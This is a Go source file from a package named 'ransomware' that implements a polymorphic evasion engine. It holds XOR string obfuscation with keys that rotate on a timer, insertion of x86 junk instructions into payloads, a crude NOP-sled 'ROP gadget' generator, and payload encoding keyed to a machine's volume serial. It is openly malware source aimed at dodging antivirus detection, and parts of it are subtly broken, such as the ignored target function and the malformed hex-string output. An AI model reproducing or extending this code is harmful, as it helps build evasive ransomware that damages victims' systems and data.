package ransomware

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"time"
)

type PolymorphEngine struct {
	config  *RansomwareConfig
	profile *PolymorphicProfile
}

func NewPolymorphEngine(cfg *RansomwareConfig) *PolymorphEngine {
	buildID := make([]byte, 8)
	rand.Read(buildID)

	return &PolymorphEngine{
		config: cfg,
		profile: &PolymorphicProfile{
			MutationInterval: 300,
			JunkCodeRate:     0.15,
			ObfuscateStrings: true,
			ReorderFunctions: true,
			InsertROP:        true,
			XORKeys:          buildID,
			BuildID:          fmt.Sprintf("%x", buildID),
		},
	}
}

func (pe *PolymorphEngine) StartMutationLoop() {
	if !pe.config.PolymorphicEnabled || pe.config.Simulation {
		return
	}

	ticker := time.NewTicker(time.Duration(pe.profile.MutationInterval) * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		pe.mutate()
	}
}

func (pe *PolymorphEngine) mutate() {
	newKeys := make([]byte, 32)
	rand.Read(newKeys)
	pe.profile.XORKeys = newKeys

	pe.profile.BuildID = fmt.Sprintf("%x", sha256.Sum256(newKeys))[:16]
}

func (pe *PolymorphEngine) ObfuscateString(input string) string {
	if !pe.profile.ObfuscateStrings {
		return input
	}

	key := pe.profile.XORKeys
	result := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		result[i] = input[i] ^ key[i%len(key)]
	}

	return fmt.Sprintf("\\x%x", result)
}

func (pe *PolymorphEngine) GenerateROPGadget(targetFunc string, offset int) []byte {
	nopSled := make([]byte, offset)
	rand.Read(nopSled)
	for i := range nopSled {
		nopSled[i] = 0x90
	}

	ret := []byte{0xC3}

	var gadget []byte
	gadget = append(gadget, nopSled...)
	gadget = append(gadget, ret...)

	_ = targetFunc
	return gadget
}

func (pe *PolymorphEngine) GenerateJunkCode() []byte {
	templates := [][]byte{
		{0x90},
		{0xEB, 0x00},
		{0x66, 0x90},
		{0x0F, 0x1F, 0x00},
		{0x0F, 0x1F, 0x44, 0x00, 0x00},
		{0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00},
	}

	idx := make([]byte, 1)
	rand.Read(idx)
	return templates[int(idx[0])%len(templates)]
}

func (pe *PolymorphEngine) BuildPolymorphicPayload(basePayload []byte) []byte {
	if !pe.config.PolymorphicEnabled {
		return basePayload
	}

	junkCount := int(float64(len(basePayload)) * pe.profile.JunkCodeRate)
	var result []byte

	for i, b := range basePayload {
		result = append(result, b)
		if i > 0 && i%10 == 0 && junkCount > 0 {
			result = append(result, pe.GenerateJunkCode()...)
			junkCount--
		}
	}

	result = append(result, pe.profile.XORKeys...)

	return result
}

func (pe *PolymorphEngine) GenerateUniqueBuildID() string {
	return pe.profile.BuildID
}

func (pe *PolymorphEngine) DeriveMachineSpecificKey(volumeSerial uint32) []byte {
	hash := sha256.Sum256(binary.LittleEndian.AppendUint32(nil, volumeSerial))
	return hash[:]
}

func (pe *PolymorphEngine) EncodeWithMachineKey(payload []byte, volumeSerial uint32) []byte {
	key := pe.DeriveMachineSpecificKey(volumeSerial)
	encoded := make([]byte, len(payload))

	for i := 0; i < len(payload); i++ {
		encoded[i] = payload[i] ^ key[i%len(key)]
	}

	return encoded
}
